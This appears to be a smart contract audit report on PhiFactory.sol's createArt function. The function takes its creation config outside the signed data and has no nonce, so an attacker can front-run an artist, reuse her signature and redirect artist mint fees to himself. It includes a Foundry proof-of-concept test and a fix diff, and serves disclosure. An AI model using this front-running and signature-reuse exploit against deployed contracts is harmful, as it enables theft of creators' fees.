# Vulnerability details

## Vulnerability Details
```solidity
    function createArt(
        bytes calldata signedData_,
        bytes calldata signature_,
@>      CreateConfig memory createConfig_
    )
```
In `createArt` function of `PhiFactory.sol`, the function allows the caller to pass in `CreateConfig memory createConfig_` in the **function parameter** instead of extracting it from `signedData_`.

Since there's also no nonce or original approved caller check, this allows for a malicious user to steal a signature obtained from a different artist and deploy an art with `createConfig_`'s receiver set to their **own address**, allowing them to receive the fees, all without permission given by `phiSignerAddress`, which breaks an invariant of the protocol about having permission, as well as stealing receiver fee.

**Sequence of exploit:**
1. Artist Alice gets permission from `phiSignerAddress`, obtaining a `signature_` for her `signedData_`.
2. She calls `createArt` with her own `createConfig_`, with `artist`,`receiver` and `mintFee` etc set to a value of her choice. Before the transaction is mined, it sits in the mempool.
3. Bob who is malicious, sees Alice's transaction in the mempool and calls `createArt` on his own with a higher gas priority fee.
4. Bob uses the same `signedData_`, `signature_` but submits his own version of `createConfig_` with `artist` and `receiver` set to an address of his choice.
5. Now, Bob has managed to deploy an art with `artist` set to himself, as well as being able to **receive artist mint fees** since he set `receiver` to himself. And all of which is done by Bob without getting permission from `phiSignerAddress` at all, breaking a key condition of the protocol.

## Proof Of Concept
Add the following function to `test/PhiFactory.t.sol:TestPhiFactory`
```solidity
function test_permissionlessDeploymentAttack() public {
  /* Alice seeks permission from Signer to deploy art piece */
    bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
    bytes memory signCreateData = abi.encode(expiresIn, ART_ID_URL_STRING, credData);
    bytes32 createMsgHash = keccak256(signCreateData);
    bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
    (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
    if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
    /*
      Even if Alice were to include the variables of the struct CreateConfig (artist, receiver etc) in signCreateData
      for the Signer to sign, it will not stop Bob from using this same signature and passing his own version of the
      struct CreateConfig, as createArt in PhiFactory.sol uses the struct passed in the parameter to create
    */
  /* end of Alice's actions */

  // Alice deploys transaction to the mempool
  // Bob sees the transaction from the mempool, steals her signature, and calls createArt as well.

  address Bob = address(0x123456);
  IPhiFactory.CreateConfig memory config = IPhiFactory.CreateConfig(Bob, Bob, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
  // Bob passes his own CreateConfig into createArt with Artist and Receiver set to himself

  vm.deal(Bob, NFT_ART_CREATE_FEE);
  vm.prank(Bob);
  phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config); //This will create an art with id of 1, since artIdCounter starts at 1

  IPhiFactory.ArtData memory data = phiFactory.artData(1);//Lets verify that Bob has indeed deployed an art with parameters artist and fee receiver set to his choice, without permission from signer
  console2.log("Bob's address =:    ", Bob);
  console2.log("Art Artist set to:  ", data.artist);
  console2.log("Fee receiver set to:", data.receiver);
}
```

As seen from the output, Bob has managed to deploy an art with `artist` and `receiver` set to himself, even though he **never** had permission from the signer to do so and he simply stole the signature from Alice and took advantage of the lack of checks to manipulate the values in the `CreateConfig` struct to make himself the artist and the fee receiver.
## Note
Extra detail to note would be that, the function also does not check for a nonce in the signature, which means that once Alice gets a signature to deploy an Art, she can carry out signature replay, and use the same signature to repeatedly deploy the same art.

However, since there seems to be no incentive for Alice in repeatedly deploying the same art, the more critical vulnerability in this signature bug would be another malicious user without permission at all, coming along to deploy and setting receiver to himself to receive mint fees without permission, which is what this bug report is centred upon.

## Recommended Mitigation Steps
Instead of allowing the user to pass in a `CreateConfig` struct in the parameter, extract it from the signature itself, thus ensuring whatever parameters(such as `artist` and `receiver`) has been approved by both `phiSignerAddress` and the original artist who got the data signed.
```diff
function createArt(
    bytes calldata signedData_,
    bytes calldata signature_,
-   CreateConfig memory createConfig_
)
    external
    payable
    nonReentrant
    whenNotPaused
    returns (address)
{
    _validateArtCreationSignature(signedData_, signature_);
-   (, string memory uri_, bytes memory credData) = abi.decode(signedData_, (uint256, string, bytes));
+   (, string memory uri_, bytes memory credData, CreateConfig memory createConfig_) = abi.decode(signedData_, (uint256, string, bytes, CreateConfig));
    ERC1155Data memory erc1155Data = _createERC1155Data(artIdCounter, createConfig_, uri_, credData);
    address artAddress = createERC1155Internal(artIdCounter, erc1155Data);
    artIdCounter++;
    return artAddress;
}
```
